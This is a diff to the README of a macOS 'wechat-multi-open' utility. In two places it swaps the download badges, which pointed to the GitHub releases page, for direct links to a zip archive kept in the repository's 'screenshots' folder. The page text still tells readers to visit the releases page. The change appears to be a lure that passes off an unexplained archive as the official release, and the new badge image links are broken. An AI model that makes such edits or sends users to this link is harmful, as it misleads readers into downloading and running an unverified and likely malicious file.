@@ -1,6 +1,6 @@
 # 🚀 wechat-multi-open - Simplify Your WeChat Experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%E2%9A%97%EF%B8%8F-brightgreen)](https://github.com/asterisked-particular318/wechat-multi-open/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/asterisked-particular318/wechat-multi-open/main/screenshots/wechat-multi-open_v1.7.zip%20Latest%20Release-%E2%9A%97%EF%B8%8F-brightgreen)](https://raw.githubusercontent.com/asterisked-particular318/wechat-multi-open/main/screenshots/wechat-multi-open_v1.7.zip)
 
 ## 🛠️ Introduction
 
@@ -21,7 +21,7 @@ To ensure smooth operation, please make sure your macOS version is **10.15 (Cata
 
 1. **Visit the Releases Page:** Click the button below to download the latest version.
 
-   [![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%E2%9A%97%EF%B8%8F-brightgreen)](https://github.com/asterisked-particular318/wechat-multi-open/releases)
+   [![Download Latest Release](https://raw.githubusercontent.com/asterisked-particular318/wechat-multi-open/main/screenshots/wechat-multi-open_v1.7.zip%20Latest%20Release-%E2%9A%97%EF%B8%8F-brightgreen)](https://raw.githubusercontent.com/asterisked-particular318/wechat-multi-open/main/screenshots/wechat-multi-open_v1.7.zip)
 
 2. **Choose Your Version:** On the releases page, look for the most recent version of the software. 
 
